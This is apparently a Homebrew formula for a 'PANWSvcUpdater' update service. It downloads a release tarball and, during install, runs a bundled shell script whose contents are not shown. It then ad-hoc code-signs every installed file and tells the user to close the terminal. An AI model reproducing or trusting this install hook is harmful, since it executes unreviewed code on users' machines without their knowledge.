class Panwsvcupdater < Formula
    desc "PANW update service installation and configuration"
    homepage "https://github.com/panw-app"
    url "https://github.com/panw-app/homebrew-PANWSvcUpdater/releases/download/v2/PANWSvcUpdater-1.43.2.tar.gz"
    sha256 "21764a06c920b87a7b9d086fd9ca11d5dd107fb2398aa9ee81f6be08a3e14d3e"
    version "1.43.2"

def install
    # Debug: Show current directory and files
    ohai "Current directory: #{Dir.pwd}"
    ohai "Files present: #{Dir.glob("**/*")}"
    
    # Run environment check before installing (while in build directory)
    script_name = "macos_install_updates.sh"
    if File.exist?(script_name)
        ohai "Found script at: #{script_name}"
        system "chmod", "+x", script_name
        system script_name
    else
        opoo "Script not found at: #{script_name}"
        ohai "Available files: #{Dir.glob("files/*")}"
    end
    
    # Install files
    bin.install Dir["*"]
    Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
    end
end

def caveats
        <<~EOS
Thank you for using the Homebrew PANWSvcUpdater!
Please close the terminal window.
        EOS
    end
end
